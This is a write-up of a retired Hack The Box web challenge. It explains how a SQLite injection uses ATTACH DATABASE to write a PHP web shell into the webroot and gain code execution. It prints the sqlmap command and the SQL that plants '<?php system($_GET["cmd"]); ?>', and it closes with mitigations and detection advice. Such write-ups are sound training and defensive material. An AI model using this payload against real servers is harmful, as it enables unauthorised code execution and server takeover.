---
challenge: Intergalactic Post
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, sqli, sqlite, rce, php]
---

# Intergalactic Post — Hack The Box (Challenge)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flag.

## TL;DR

A SQLite SQLi writes a PHP file into the webroot via `ATTACH DATABASE`. Visiting it executes code and reads the flag.

## Prompt and surface

- Web, Easy, retired.
- Search/subscribe parameter.
- SQLite backend.

```bash
curl -i 'http://<HOST>/?search=test'
```

## Reconnaissance

Confirm injection with a quote and identify SQLite from errors. Enumerate tables and columns.

```bash
sqlmap -u 'http://<HOST>/?search=test' --batch --dbms=sqlite --dbs
```

## Analysis

1. Confirm the database user can write files.
2. Use `ATTACH DATABASE '/var/www/html/shell.php' AS pwn`.
3. Create a table with PHP code in a column.
4. Visit `shell.php?cmd=id`.
5. Read the flag.

```sql
ATTACH DATABASE '/var/www/html/shell.php' AS pwn;
CREATE TABLE pwn.x (y text);
INSERT INTO pwn.x VALUES ('<?php system($_GET["cmd"]); ?>');
```

## Root cause

The query concatenates input and the database can write to the webroot. SQLite lets an attached database become a PHP file.

## Local reproduction

1. Run SQLite + PHP.
2. Confirm SQLi.
3. Write the file.
4. Execute the webshell.
5. Restrict permissions and compare.

## Evidence

- SQLi error/confirmation.
- Write query.
- Webshell and redacted flag.

## Lessons learned

- SQLite supports `ATTACH DATABASE`.
- Webroot write turns SQLi into RCE.
- Database permissions matter.
- Parameterisation prevents it.

## Mitigation and detection

- Prepared statements.
- DB user without webroot write.
- Webroot without execution of uploaded files.
- Monitor new PHP files.

## References

- <https://www.hackthebox.com/challenges/intergalactic-post>
- <https://www.sqlite.org/lang_attach.html>
- <https://owasp.org/www-community/attacks/SQL_Injection>
